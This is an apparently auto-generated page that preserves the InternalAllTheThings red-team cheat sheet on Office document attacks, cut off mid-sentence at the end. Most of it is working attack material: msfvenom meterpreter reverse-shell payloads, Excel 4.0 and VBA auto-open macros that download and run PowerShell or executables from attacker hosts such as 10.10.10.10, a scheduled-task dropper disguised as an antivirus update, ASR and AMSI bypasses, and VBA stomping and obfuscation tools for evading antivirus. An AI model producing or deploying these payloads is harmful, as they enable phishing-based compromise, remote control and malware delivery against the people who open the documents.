---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# Office - Attacks

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-redteam-access-office-attacks` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/redteam/access/office-attacks.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Office - Attacks](../../topics/redteam/office-attacks.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-redteam-access-office-attacks |
| name | Office - Attacks |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/redteam/access/office-attacks.md |

## Preserved Source Material

````yaml
_body: "# Office - Attacks\n\n## Summary\n\n* [Office Products Features](#office-products-features)\n* [Office Default Passwords](#office-default-passwords)\n\
  * [Excel](#excel)\n    * [XLSM - Hot Manchego](#xlsm---hot-manchego)\n    * [XLM - Macrome](#xlm---macrome)\n    * [XLM\
  \ Excel 4.0 - SharpShooter](#xlm-excel-40---sharpshooter)\n    * [XLM Excel 4.0 - EXCELntDonut](#xlm-excel-40---excelntdonut)\n\
  \    * [XLM Excel 4.0 - EXEC](#xlm-excel-40---exec)\n    * [SLK - EXEC](#slk---exec)\n    * [XLL - EXEC](#xll---exec)\n\
  * [Word](#word)\n    * [DOCM - Metasploit](#docm---metasploit)\n    * [DOCM - Download and Execute](#docm---download-and-execute)\n\
  \    * [DOCM - Macro Creator](#docm---macro-creator)\n    * [DOCM - C# converted to Office VBA macro](#docm---c-converted-to-office-vba-macro)\n\
  \    * [DOCM - VBA Wscript](#docm---vba-wscript)\n    * [DOCM - VBA Shell Execute Comment](#docm---vba-shell-execute-comment)\n\
  \    * [DOCM - VBA Spawning via svchost.exe using Scheduled Task](#docm---vba-spawning-via-svchostexe-using-scheduled-task)\n\
  \    * [DCOM - WMI COM functions (VBA AMSI)](#docm---wmi-com-functions)\n    * [DOCM - Macro Pack - Macro and DDE](#docmxlm---macro-pack---macro-and-dde)\n\
  \    * [DOCM - BadAssMacros](#docm---badassmacros)\n    * [DOCM - CACTUSTORCH VBA Module](#docm---cactustorch-vba-module)\n\
  \    * [DOCM - MMG with Custom DL + Exec](#docm---mmg-with-custom-dl--exec)\n    * [VBA Obfuscation](#vba-obfuscation)\n\
  \    * [VBA Purging](#vba-purging)\n        * [OfficePurge](#officepurge)\n        * [EvilClippy](#evilclippy)\n    * [VBA\
  \ - Offensive Security Template](#vba---offensive-security-template)\n    * [VBA - AMSI](#vba---amsi)\n    * [DOCX - Template\
  \ Injection](#docx---template-injection)\n    * [DOCX - DDE](#docx---dde)\n* [Visual Studio Tools for Office (VSTO)](#visual-studio-tools-for-office-vsto)\n\
  * [Office Macro Development](#office-macro-development)\n    * [Execute WinAPI](#execute-winapi)\n* [References](#references)\n\
  \n## Office Products Features\n\n![Overview of features supported by different Office products](https://www.securesystems.de/images/blog/offphish-phishing-revisited-in-2023/Office_documents_feature_overview.png)\n\
  \n## Office Default Passwords\n\nBy default, Excel does not set a password when saving a new file. However, some older versions\
  \ of Excel had a default password that was used if the user did not set a password themselves. The default password was\
  \ \"`VelvetSweatshop`\", and it could be used to open any file that did not have a password set.\n\n> If the user has not\
  \ supplied an encryption password and the document is encrypted, the default encryption choice using the techniques specified\
  \ in section 2.3 MUST be the following password: \"`\\x2f\\x30\\x31\\x48\\x61\\x6e\\x6e\\x65\\x73\\x20\\x52\\x75\\x65\\\
  x73\\x63\\x68\\x65\\x72\\x2f\\x30\\x31`\". - [2.4.2.3 Binary Document Write Protection Method 3](https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-offcrypto/57fc02f0-c1de-4fc6-908f-d146104662f5)\n\
  \n| Product    | Password         | Supported Formats |\n|------------|------------------|-------------------|\n| Excel\
  \      | VelvetSweatshop  | all Excel formats |\n| PowerPoint | 01Hannes Ruescher/01 | .pps .ppt     |\n\n## Excel\n\n###\
  \ XLSM - Hot Manchego\n\n> When using EPPlus, the creation of the Excel document varied significantly enough that most A/V\
  \ didn't catch a simple lolbas payload to get a beacon on a target machine.\n\n* [FortyNorthSecurity/hot-manchego](https://github.com/FortyNorthSecurity/hot-manchego)\n\
  \n```ps1\nGenerate CS Macro and save it to Windows as vba.txt\nPS> New-Item blank.xlsm\nPS> C:\\Windows\\Microsoft.NET\\\
  Framework\\v4.0.30319\\csc.exe /reference:EPPlus.dll hot-manchego.cs\nPS> .\\hot-manchego.exe .\\blank.xlsm .\\vba.txt\n\
  ```\n\n### XLM - Macrome\n\n> XOR Obfuscation technique will NOT work with VBA macros since VBA is stored in a different\
  \ stream that will not be encrypted when you password protect the document. This only works for Excel 4.0 macros.\n\n* [michaelweber/Macrome/Macrome-0.3.0-osx-x64.zip](https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-osx-x64.zip)\n\
  * [michaelweber/Macrome/Macrome-0.3.0-linux-x64.zip](https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-linux-x64.zip)\n\
  * [michaelweber/Macrome/Macrome-0.3.0-win-x64.zip](https://github.com/michaelweber/Macrome/releases/download/0.3.0/Macrome-0.3.0-win-x64.zip)\n\
  \n```ps1\n# NOTE: The payload cannot contains NULL bytes.\n\n# Default calc\nmsfvenom -a x86 -b '\\x00' --platform windows\
  \ -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin\nmsfvenom -a x64 -b '\\x00' --platform\
  \ windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin\n# Custom shellcode\nmsfvenom\
  \ -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-86.bin\
  \ -b '\\x00'\nmsfvenom -p generic/custom PAYLOADFILE=payload64.bin -a x64 --platform windows -e x64/xor_dynamic -f raw -o\
  \ shellcode-64.bin -b '\\x00'\n# MSF shellcode\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.59 LPORT=443\
  \ -b '\\x00'  -a x64 --platform windows -e x64/xor_dynamic --platform windows -f raw -o msf64.bin\nmsfvenom -p windows/meterpreter/reverse_https\
  \ LHOST=192.168.1.59 LPORT=443 -b '\\x00' -a x86 --encoder x86/shikata_ga_nai --platform windows -f raw -o msf86.bin\n\n\
  dotnet Macrome.dll build --decoy-document decoy_document.xls --payload popcalc.bin --payload64-bit popcalc64.bin\ndotnet\
  \ Macrome.dll build --decoy-document decoy_document.xls --payload shellcode-86.bin --payload64-bit shellcode-64.bin\n\n\
  # For VBA Macro\nMacrome build --decoy-document decoy_document.xls --payload-type Macro --payload macro_example.txt --output-file-name\
  \ xor_obfuscated_macro_doc.xls --password VelvetSweatshop\n```\n\nWhen using Macrome build mode, the --password flag may\
  \ be used to encrypt the generated document using XOR Obfuscation. If the default password of **VelvetSweatshop** is used\
  \ when building the document, all versions of Excel will automatically decrypt the document without any additional user\
  \ input. This password can only be set in Excel 2003.\n\n### XLM Excel 4.0 - SharpShooter\n\n* [mdsecactivebreach/SharpShooter](https://github.com/mdsecactivebreach/SharpShooter)\n\
  \n```powershell\n# Options\n-rawscfile <path>  Path to raw shellcode file for stageless payloads\n--scfile <path>    Path\
  \ to shellcode file as CSharp byte array\npython SharpShooter.py --payload slk --rawscfile shellcode.bin --output test\n\
  \n# Creation of a VBA Macro\n# creates a VBA macro file that uses the the XMLDOM COM interface to retrieve and execute a\
  \ hosted stylesheet.\nSharpShooter.py --stageless --dotnetver 2 --payload macro --output foo --rawscfile ./x86payload.bin\
  \ --com xslremote --awlurl http://192.168.2.8:8080/foo.xsl\n\n# Creation of an Excel 4.0 SLK Macro Enabled Document\n~#\
  \ /!\\ The shellcode cannot contain null bytes\nmsfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows\
  \ -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\\x00'\nSharpShooter.py --payload slk --output foo --rawscfile\
  \ ~./x86payload.bin --smuggle --template mcafee\n\nmsfvenom -p generic/custom PAYLOADFILE=payload86.bin -a x86 --platform\
  \ windows -e x86/shikata_ga_nai -f raw -o /tmp/shellcode-86.bin -b '\\x00'\nSharpShooter.py --payload slk --output foo --rawscfile\
  \ /tmp/shellcode-86.bin --smuggle --template mcafee\n```\n\n### XLM Excel 4.0 - EXCELntDonut\n\n* XLM (Excel 4.0) macros\
  \ pre-date VBA and can be delivered in .xls files.\n* AMSI has no visibility into XLM macros (for now)\n* Anti-virus struggles\
  \ with XLM (for now)\n* XLM macros can access the Win32 API (virtualalloc, createthread, ...)\n\n1. Open an Excel Workbook.\n\
  2. Right click on \"Sheet 1\" and click \"Insert...\". Select \"MS Excel 4.0 Macro\".\n3. Open your EXCELntDonut output\
  \ file in a text editor and copy everything.\n4. Paste the EXCELntDonut output text in Column A of your XLM Macro sheet.\n\
  5. At this point, everything is in column A. To fix that, we'll use the \"Text-to-Columns\"/\"Convert\" tool under the \"\
  Data\" tab.\n6. Highlight column A and open the \"Text-to-Columns\"  tool. Select \"Delimited\" and then \"Semicolon\" on\
  \ the next screen. Select \"Finished\".\n7. Right-click on cell A1* and select \"Run\". This will execute your payload to\
  \ make sure it works.\n8. To enable auto-execution, we need to rename cell A1*to \"Auto_Open\". You can do this by clicking\
  \ into cell A1 and then clicking into the box that says \"A1\"* just above Column A. Change the text from \"A1\"* to \"\
  Auto_Open\". Save the file and verify that auto-execution works.\n\n:warning: If you're using the obfuscate flag, after\
  \ the Text-to-columns operation, your macros won't start in A1. Instead, they'll start at least 100 columns to the right.\
  \ Scroll horizontally until you see the first cell of text. Let's say that cell is HJ1. If that's the case, then complete\
  \ steps 6-7 substituting HJ1 for A1\n\n```ps1\ngit clone https://github.com/FortyNorthSecurity/EXCELntDonut\n\n-f path to\
  \ file containing your C# source code (exe or dll)\n-c ClassName where method that you want to call lives (dll)\n-m Method\
  \ containing your executable payload (dll)\n-r References needed to compile your C# code (ex: -r 'System.Management')\n\
  -o output filename\n--sandbox Perform basic sandbox checks. \n--obfuscate Perform basic macro obfuscation. \n\n# Fork\n\
  git clone https://github.com/d-sec-net/EXCELntDonut/blob/master/EXCELntDonut/drive.py\nC:\\Windows\\Microsoft.NET\\Framework64\\\
  v4.0.30319\\csc.exe -platform:x64 -out:GruntHttpX64.exe C:\\Users\\User\\Desktop\\covenSource.cs \nC:\\Windows\\Microsoft.NET\\\
  Framework64\\v4.0.30319\\csc.exe -platform:x86 -out:GruntHttpX86.exe C:\\Users\\User\\Desktop\\covenSource.cs\ndonut.exe\
  \ -a1 -o GruntHttpx86.bin GruntHttpX86.exe\ndonut.exe -a2 -o GruntHttpx64.bin GruntHttpX64.exe\nusage: drive.py [-h] --x64bin\
  \ X64BIN --x86bin X86BIN [-o OUTPUTFILE] [--sandbox] [--obfuscate]\npython3 drive.py --x64bin GruntHttpx64.bin --x86bin\
  \ GruntHttpx86.bin\n```\n\nXLM: [Synzack/synzack.github.io/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md](https://github.com/Synzack/synzack.github.io/blob/3dd471d4f15db9e82c20e2f1391a7a598b456855/_posts/2020-05-25-Weaponizing-28-Year-Old-XLM-Macros.md)\n\
  \n### XLM Excel 4.0 - EXEC\n\n1. Right Click to the current sheet\n2. Insert a **Macro IntL MS Excel 4.0**\n3. Add the `EXEC`\
  \ macro\n\n    ```powershell\n    =EXEC(\"poWerShell IEX(nEw-oBject nEt.webclient).DownloAdStRiNg('http://10.10.10.10:80/update.ps1')\"\
  )\n    =halt()\n    ```\n\n4. Rename cell to **Auto_open**\n5. Hide your macro worksheet by a right mouse click on the sheet\
  \ name **Macro1** and selecting **Hide**\n\n### SLK - EXEC\n\n```ps1\nID;P\nO;E\nNN;NAuto_open;ER101C1;KOut Flank;F\nC;X1;Y101;K0;EEXEC(\"\
  c:\\shell.cmd\")\nC;X1;Y102;K0;EHALT()\nE\n```\n\n### XLL - EXEC\n\nAn \"XLL\" file is a type of file used primarily with\
  \ Microsoft Excel. It stands for \"Excel Add-In Library\" and is a dynamic link library (DLL) specifically designed to be\
  \ loaded into Microsoft Excel. These files extend Excel's functionality by adding extra features, functions, or capabilities\
  \ that are not available in the standard installation of Excel.\n\n:warning: Excel is blocking untrusted XLL add-ins by\
  \ default\n\n* Compile with: `cl.exe notepadXLL.c /LD /o notepad.xll`\n\n    ```c\n    #include <Windows.h>\n\n    __declspec(dllexport)\
  \ void __cdecl xlAutoOpen(void); \n\n    void __cdecl xlAutoOpen() {\n        // Triggers when Excel opens\n        WinExec(\"\
  cmd.exe /c notepad.exe\", 1);\n    }\n\n    BOOL APIENTRY DllMain( HMODULE hModule,\n                        DWORD  ul_reason_for_call,\n\
  \                        LPVOID lpReserved\n                        )\n    {\n        switch (ul_reason_for_call)\n    \
  \    {\n        case DLL_PROCESS_ATTACH:\n        case DLL_THREAD_ATTACH:\n        case DLL_THREAD_DETACH:\n        case\
  \ DLL_PROCESS_DETACH:\n            break;\n        }\n        return TRUE;\n    }\n    ```\n\n## Word\n\n### DOCM - Metasploit\n\
  \n```ps1\nuse exploit/multi/fileformat/office_word_macro\nset payload windows/meterpreter/reverse_http\nset LHOST 10.10.10.10\n\
  set LPORT 80\nset DisablePayloadHandler True\nset PrependMigrate True\nset FILENAME Financial2021.docm\nexploit -j\n```\n\
  \n### DOCM - Download and Execute\n\n> Detected by Defender (AMSI)\n\n```ps1\nSub Execute()\nDim payload\npayload = \"powershell.exe\
  \ -nop -w hidden -c [System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true};$v=new-object net.webclient;$v.proxy=[Net.WebRequest]::GetSystemWebProxy();$v.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX\
  \ $v.downloadstring('http://10.10.10.10:4242/exploit');\"\nCall Shell(payload, vbHide)\nEnd Sub\nSub Document_Open()\nExecute\n\
  End Sub\n```\n\n### DOCM - Macro Creator\n\n* [Arno0x/PowerShellScripts/MacroCreator](https://github.com/Arno0x/PowerShellScripts/tree/master/MacroCreator)\n\
  \n```ps1\n# Shellcode embedded in the body of the MS-Word document, no obfuscation, no sandbox evasion:\nC:\\PS> Invoke-MacroCreator\
  \ -i meterpreter_shellcode.raw -t shellcode -d body\n# Shellcode delivered over WebDAV covert channel, with obfuscation,\
  \ no sandbox evasion:\nC:\\PS> Invoke-MacroCreator -i meterpreter_shellcode.raw -t shellcode -url webdavserver.com -d webdav\
  \ -o\n# Scriptlet delivered over bibliography source covert channel, with obfuscation, with sandbox evasion:\nC:\\PS> Invoke-MacroCreator\
  \ -i regsvr32.sct -t file -url 'http://my.server.com/sources.xml' -d biblio -c 'regsvr32 /u /n /s /i:regsvr32.sct scrobj.dll'\
  \ -o -e\n```\n\n### DOCM - C# converted to Office VBA macro\n\n> A message will prompt to the user saying that the file\
  \ is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the victim to thinking\
  \ the excel document is corrupted.\n\n* [trustedsec/unicorn](https://github.com/trustedsec/unicorn)\n\n```ps1\npython unicorn.py\
  \ payload.cs cs macro\n```\n\n### DOCM - VBA Wscript\n\n```ps1\nSub parent_change()\n    Dim objOL\n    Set objOL = CreateObject(\"\
  Outlook.Application\")\n    Set shellObj = objOL.CreateObject(\"Wscript.Shell\")\n    shellObj.Run(\"notepad.exe\")\nEnd\
  \ Sub\nSub AutoOpen()\n    parent_change\nEnd Sub\nSub Auto_Open()\n    parent_change\nEnd Sub\n```\n\n```vb\nCreateObject(\"\
  WScript.Shell\").Run \"calc.exe\"\nCreateObject(\"WScript.Shell\").Exec \"notepad.exe\"\n```\n\n### DOCM - VBA Shell Execute\
  \ Comment\n\nSet your command payload inside the **Comment** metadata of the document.\n\n```vb\nSub beautifulcomment()\n\
  \    Dim p As DocumentProperty\n    For Each p In ActiveDocument.BuiltInDocumentProperties\n        If p.Name = \"Comments\"\
  \ Then\n            Shell (p.Value)\n        End If\n    Next\nEnd Sub\n\nSub AutoExec()\n    beautifulcomment\nEnd Sub\n\
  \nSub AutoOpen()\n    beautifulcomment\nEnd Sub\n```\n\n### DOCM - VBA Spawning via svchost.exe using Scheduled Task\n\n\
  ```vb\nSub AutoOpen()\n    Set service = CreateObject(\"Schedule.Service\")\n    Call service.Connect\n    Dim td: Set td\
  \ = service.NewTask(0)\n    td.RegistrationInfo.Author = \"Kaspersky Corporation\"\n    td.settings.StartWhenAvailable =\
  \ True\n    td.settings.Hidden = False\n    Dim triggers: Set triggers = td.triggers\n    Dim trigger: Set trigger = triggers.Create(1)\n\
  \    Dim startTime: ts = DateAdd(\"s\", 30, Now)\n    startTime = Year(ts) & \"-\" & Right(Month(ts), 2) & \"-\" & Right(Day(ts),\
  \ 2) & \"T\" & Right(Hour(ts), 2) & \":\" & Right(Minute(ts), 2) & \":\" & Right(Second(ts), 2)\n    trigger.StartBoundary\
  \ = startTime\n    trigger.ID = \"TimeTriggerId\"\n    Dim Action: Set Action = td.Actions.Create(0)\n    Action.Path =\
  \ \"C:\\Windows\\System32\\powershell.exe\"\n    Action.Arguments = \"-nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))\"\
  \n    Call service.GetFolder(\"\\\").RegisterTaskDefinition(\"AVUpdateTask\", td, 6, , , 3)\nEnd Sub\nRem powershell.exe\
  \ -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.1.59:80/fezsdfqs'))\"\n```\n\n### DOCM\
  \ - WMI COM functions\n\nBasic WMI exec (detected by Defender) : `r = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\"\
  ).Create(\"calc.exe\", null, null, intProcessID)`\n\n```vb\nSub wmi_exec()\n    strComputer = \".\"\n    Set objWMIService\
  \ = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\\cimv2\")\n    Set objStartUp = objWMIService.Get(\"Win32_ProcessStartup\"\
  )\n    Set objProc = objWMIService.Get(\"Win32_Process\")\n    Set procStartConfig = objStartUp.SpawnInstance_\n    procStartConfig.ShowWindow\
  \ = 1\n    objProc.Create \"powershell.exe\", Null, procStartConfig, intProcessID\nEnd Sub\n```\n\n* [infosecn1nja/ASR Rules\
  \ Bypass.vba](https://gist.github.com/infosecn1nja/24a733c5b3f0e5a8b6f0ca2cf75967e3)\n* <https://labs.inquest.net/dfi/sha256/f4266788d4d1bec6aac502ddab4f7088a9840c84007efd90c5be7ecaec0ed0c2>\n\
  \n```vb\nSub ASR_bypass_create_child_process_rule5()\n    Const HIDDEN_WINDOW = 0\n    strComputer = \".\"\n    Set objWMIService\
  \ = GetObject(\"win\" & \"mgmts\" & \":\\\\\" & strComputer & \"\\root\" & \"\\cimv2\")\n    Set objStartup = objWMIService.Get(\"\
  Win32_\" & \"Process\" & \"Startup\")\n    Set objConfig = objStartup.SpawnInstance_\n    objConfig.ShowWindow = HIDDEN_WINDOW\n\
  \    Set objProcess = GetObject(\"winmgmts:\\\\\" & strComputer & \"\\root\" & \"\\cimv2\" & \":Win32_\" & \"Process\")\n\
  \    objProcess.Create \"cmd.exe /c powershell.exe IEX ( IWR -uri 'http://10.10.10.10/stage.ps1')\", Null, objConfig, intProcessID\n\
  End Sub\n\nSub AutoExec()\n    ASR_bypass_create_child_process_rule5\nEnd Sub\n\nSub AutoOpen()\n    ASR_bypass_create_child_process_rule5\n\
  End Sub\n```\n\n```vb\nConst ShellWindows = \"{9BA05972-F6A8-11CF-A442-00A0C90A8F39}\"\nSet SW = GetObject(\"new:\" & ShellWindows).Item()\n\
  SW.Document.Application.ShellExecute \"cmd.exe\", \"/c powershell.exe\", \"C:\\Windows\\System32\", Null, 0\n```\n\n###\
  \ DOCM/XLM - Macro Pack - Macro and DDE\n\n> Only the community version is available online.\n\n* [sevagas/macro_pack](https://github.com/sevagas/macro_pack/releases/download/v2.0.1/macro_pack.exe)\n\
  \n```powershell\n# Options\n-G, --generate=OUTPUT_FILE_PATH. Generates a file. \n-t, --template=TEMPLATE_NAME    Use code\
  \ template already included in MacroPack\n-o, --obfuscate Obfuscate code (remove spaces, obfuscate strings, obfuscate functions\
  \ and variables name)\n\n# Execute a command\necho \"calc.exe\" | macro_pack.exe -t CMD -G cmd.xsl\n\n# Download and execute\
  \ a file\necho <file_to_drop_url> \"<download_path>\" | macro_pack.exe -t DROPPER -o -G dropper.xls\n\n# Meterpreter reverse\
  \ TCP template using MacroMeter by Cn33liz\necho <ip> <port> | macro_pack.exe -t METERPRETER -o -G meter.docm\n\n# Drop\
  \ and execute embedded file\nmacro_pack.exe -t EMBED_EXE --embed=c:\\windows\\system32\\calc.exe -o -G my_calc.vbs\n\n#\
  \ Obfuscate the vba file generated by msfvenom and put result in a new vba file.\nmsfvenom -p windows/meterpreter/reverse_tcp\
  \ LHOST=192.168.0.5 -f vba | macro_pack.exe -o -G meterobf.vba\n\n# Obfuscate Empire stager vba file and generate a MS Word\
  \ document:\nmacro_pack.exe -f empire.vba -o -G myDoc.docm\n\n# Generate an MS Excel file containing an obfuscated dropper\
  \ (download payload.exe and store as dropped.exe)\necho \"https://myurl.url/payload.exe\" \"dropped.exe\" |  macro_pack.exe\
  \ -o -t DROPPER -G \"drop.xlsm\" \n\n# Execute calc.exe via Dynamic Data Exchange (DDE) attack\necho calc.exe | macro_pack.exe\
  \ --dde -G calc.xslx\n\n# Download and execute file via powershell using Dynamic Data Exchange (DDE) attack\nmacro_pack.exe\
  \ --dde -f ..\\resources\\community\\ps_dl_exec.cmd -G DDE.xsl\n\n# PRO: Generate a Word file containing VBA self encoded\
  \ x64 reverse meterpreter VBA payload (will bypass most AV).\nmsfvenom.bat -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.5\
  \ -f vba |  macro_pack.exe -o --autopack --keep-alive  -G  out.docm\n\n# PRO: Trojan a PowerPoint file with a reverse meterpreter.\
  \ Macro is obfuscated and mangled to bypass AMSI and most antiviruses.\nmsfvenom.bat -p windows/meterpreter/reverse_tcp\
  \ LHOST=192.168.0.5 -f vba |  macro_pack.exe -o --autopack --trojan -G  hotpics.pptm\n\n# PRO: Generate an HTA payload able\
  \ to run a shellcode via Excel injection\necho meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE  --run-in-excel\
  \ -o -G samples\\nicepic.hta\necho meterx86.bin meterx64.bin | macro_pack.exe -t AUTOSHELLCODE -o --hta-macro --run-in-excel\
  \ -G samples\\my_shortcut.lnk\n\n# PRO: XLM Injection\necho \"MPPro\" | macro_pack.exe -G _samples\\hello.doc -t HELLO --xlm\
  \ --run-in-excel\n\n# PRO: ShellCode Exec - Heap Injection, AlternativeInjection\necho \"x32calc.bin\" | macro_pack.exe\
  \ -t SHELLCODE -o --shellcodemethod=HeapInjection -G test.doc\necho \"x32calc.bin\" | macro_pack.exe -t SHELLCODE -o --shellcodemethod=AlternativeInjection\
  \ --background -G test.doc\n\n# PRO: More shellcodes\necho x86.bin | macro_pack.exe -t SHELLCODE -o -G test.pptm –keep-alive\n\
  echo \"x86.bin\" \"x64.bin\" | macro_pack.exe -t AUTOSHELLCODE -o –autopack -G sc_auto.doc\necho \"http://192.168.5.10:8080/x32calc.bin\"\
  \ \"http://192.168.5.10:8080/x64calc.bin\" | macro_pack.exe -t DROPPER_SHELLCODE -o --shellcodemethod=ClassicIndirect -G\
  \ samples\\sc_dl.xls\n```\n\n### DOCM - BadAssMacros\n\n> C# based automated Malicous Macro Generator.\n\n* [Inf0secRabbit/BadAssMacros](https://github.com/Inf0secRabbit/BadAssMacros)\n\
  \n```powershell\nBadAssMacros.exe -h\n\n# Create VBA for classic shellcode injection from raw shellcode\nBadAssMacros.exe\
  \ -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s classic -c <caesar_shift_value> -o <path_to_output_file>\nBadAssMacros.exe\
  \ -i .\\Desktop\\payload.bin -w doc -p no -s classic -c 23 -o .\\Desktop\\output.txt\n\n# Create VBA for indirect shellcode\
  \ injection from raw shellcode\nBadAssMacros.exe -i <path_to_raw_shellcode_file> -w <doc/excel> -p no -s indirect -o <path_to_output_file>\n\
  \n# List modules inside Doc/Excel file\nBadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -l\n\n# Purge\
  \ Doc/Excel file\nBadAssMacros.exe -i <path_to_doc/excel_file> -w <doc/excel> -p yes -o <path_to_output_file> -m <module_name>\n\
  ```\n\n### DOCM - CACTUSTORCH VBA Module\n\n> CactusTorch is leveraging the DotNetToJscript technique to load a .Net compiled\
  \ binary into memory and execute it from vbscript\n\n* [mdsecactivebreach/CACTUSTORCH](https://github.com/mdsecactivebreach/CACTUSTORCH)\n\
  * [tyranid/DotNetToJScript](https://github.com/tyranid/DotNetToJScript)\n* [CACTUSTORCH - DotNetToJScript all the things](https://youtu.be/YiaKb8nHFSY)\n\
  * [CACTUSTORCH - CobaltStrike Aggressor Script Addon](https://www.youtube.com/watch?v=_pwH6a-6yAQ)\n\n1. Import **.cna**\
  \ in Cobalt Strike\n2. Generate a new VBA payload from the CACTUSTORCH menu\n3. Download DotNetToJscript\n4. Compile it\n\
  \    * **DotNetToJscript.exe** - responsible for bootstrapping C# binaries (supplied as input) and converting them to JavaScript\
  \ or VBScript\n    * **ExampleAssembly.dll** - the C# assembly that will be given to DotNetToJscript.exe. In default project\
  \ configuration, the assembly just pops a message box with the text \"test\"\n5. Execute **DotNetToJscript.exe** and supply\
  \ it with the ExampleAssembly.dll, specify the output file and the output type\n\n    ```ps1\n    DotNetToJScript.exeExampleAssembly.dll\
  \ -l vba -o test.vba -c cactusTorch\n    ```\n\n6. Use the generated code to replace the hardcoded binary in CactusTorch\n\
  \n### DOCM - MMG with Custom DL + Exec\n\n1. Custom Download in first Macro to \"C:\\\\Users\\\\Public\\\\beacon.exe\"\n\
  2. Create a custom binary execute using MMG\n3. Merge both Macro\n\n```ps1\ngit clone https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator\n\
  python MMG.py configs/generic-cmd.json malicious.vba\n{\n \"description\": \"Generic command exec payload\\nEvasion technique\
  \ set to none\",\n \"template\": \"templates/payloads/generic-cmd-template.vba\",\n \"varcount\": 152,\n \"encodingoffset\"\
  : 5,\n \"chunksize\": 180,\n \"encodedvars\":  {},\n \"vars\":  [],\n \"evasion\":  [\"encoder\"],\n \"payload\": \"cmd.exe\
  \ /c C:\\\\Users\\\\Public\\\\beacon.exe\"\n}\n```\n\n```vb\nPrivate Declare PtrSafe Function URLDownloadToFile Lib \"urlmon\"\
  \ Alias \"URLDownloadToFileA\" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved\
  \ As Long, ByVal lpfnCB As Long) As Long\n\nPublic Function DownloadFileA(ByVal URL As String, ByVal DownloadPath As String)\
  \ As Boolean\n    On Error GoTo Failed\n    DownloadFileA = False\n    'As directory must exist, this is a check\n    If\
  \ CreateObject(\"Scripting.FileSystemObject\").FolderExists(CreateObject(\"Scripting.FileSystemObject\").GetParentFolderName(DownloadPath))\
  \ = False Then Exit Function\n    Dim returnValue As Long\n    returnValue = URLDownloadToFile(0, URL, DownloadPath, 0,\
  \ 0)\n    'If return value is 0 and the file exist, then it is considered as downloaded correctly\n    DownloadFileA = (returnValue\
  \ = 0) And (Len(Dir(DownloadPath)) > 0)\n    Exit Function\n\nFailed:\nEnd Function\n\nSub AutoOpen()\n    DownloadFileA\
  \ \"http://10.10.10.10/macro.exe\", \"C:\\\\Users\\\\Public\\\\beacon.exe\"\nEnd Sub\n\n\nSub Auto_Open()\n    DownloadFileA\
  \ \"http://10.10.10.10/macro.exe\", \"C:\\\\Users\\\\Public\\\\beacon.exe\"\nEnd Sub\n```\n\n### DOCM - ActiveX-based (InkPicture\
  \ control, Painted event) Autorun macro\n\nGo to **Developer tab** on ribbon `-> Insert -> More Controls -> Microsoft InkPicture\
  \ Control`\n\n```vb\nPrivate Sub InkPicture1_Painted(ByVal hDC As Long, ByVal Rect As MSINKAUTLib.IInkRectangle)\nRun =\
  \ Shell(\"cmd.exe /c PowerShell (New-Object System.Net.WebClient).DownloadFile('https://<host>/file.exe','file.exe');Start-Process\
  \ 'file.exe'\", vbNormalFocus)\nEnd Sub\n```\n\n### VBA Obfuscation\n\n* [bonnetn/vba-obfuscator](https://github.com/bonnetn/vba-obfuscator)\
  \ [Youtube demo](https://www.youtube.com/watch?v=L0DlPOLx2k0)\n\n    ```ps1\n    cat example_macro/download_payload.vba\
  \ | docker run -i --rm bonnetn/vba-obfuscator /dev/stdin\n    ```\n\n* [trustedsec/The_Shelf/spinningteacup](https://github.com/trustedsec/The_Shelf/tree/main/Retired/spinningteacup)\n\
  \n### VBA Purging\n\n**VBA Stomping**: This technique allows attackers to remove compressed VBA code from Office documents\
  \ and still execute malicious macros without many of the VBA keywords that AV engines had come to rely on for detection.\
  \ == Removes P-code.\n\n:warning: VBA stomping is not effective against Excel 97-2003 Workbook (.xls) format.\n\n#### OfficePurge\n\
  \n* [fireeye/OfficePurge](https://github.com/fireeye/OfficePurge/releases/download/v1.0/OfficePurge.exe)\n\n```powershell\n\
  OfficePurge.exe -d word -f .\\malicious.doc -m NewMacros\nOfficePurge.exe -d excel -f .\\payroll.xls -m Module1\nOfficePurge.exe\
  \ -d publisher -f .\\donuts.pub -m ThisDocument\nOfficePurge.exe -d word -f .\\malicious.doc -l\n```\n\n#### EvilClippy\n\
  \n> Evil Clippy uses the OpenMCDF library to manipulate CFBF files.\n> Evil Clippy compiles perfectly fine with the Mono\
  \ C# compiler and has been tested on Linux, OSX and Windows.\n> If you want to manipulate CFBF files manually, then FlexHEX\
